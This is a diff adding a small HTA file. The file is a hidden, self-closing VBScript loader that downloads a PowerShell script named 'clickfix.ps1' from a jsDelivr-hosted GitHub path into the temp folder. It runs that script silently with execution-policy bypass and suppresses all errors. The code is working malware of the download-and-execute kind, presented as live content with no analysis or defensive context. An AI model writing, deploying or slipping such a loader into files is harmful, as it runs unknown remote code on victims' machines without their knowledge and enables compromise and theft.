@@ -1,0 +1,25 @@
+<html>
+<head><title>.</title>
+<hta:application id="o" showintaskbar="no" caption="no" border="none" windowstate="minimize" />
+<script language="VBScript">
+On Error Resume Next
+Set s = CreateObject("WScript.Shell")
+Set h = CreateObject("MSXML2.ServerXMLHTTP")
+h.Open "GET", "https://cdn.jsdelivr.net/gh/kai195102/d@main/clickfix.ps1", False
+h.Send
+If h.Status = 200 Then
+  Set f = CreateObject("Scripting.FileSystemObject")
+  t = f.GetSpecialFolder(2)
+  p = t & "\c.ps1"
+  Set m = CreateObject("ADODB.Stream")
+  m.Type = 1 : m.Open
+  m.Write h.ResponseBody
+  m.SaveToFile p, 2
+  m.Close
+  s.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -F """ & p & """", 0, False
+End If
+window.close()
+</script>
+</head>
+<body></body>
+</html>
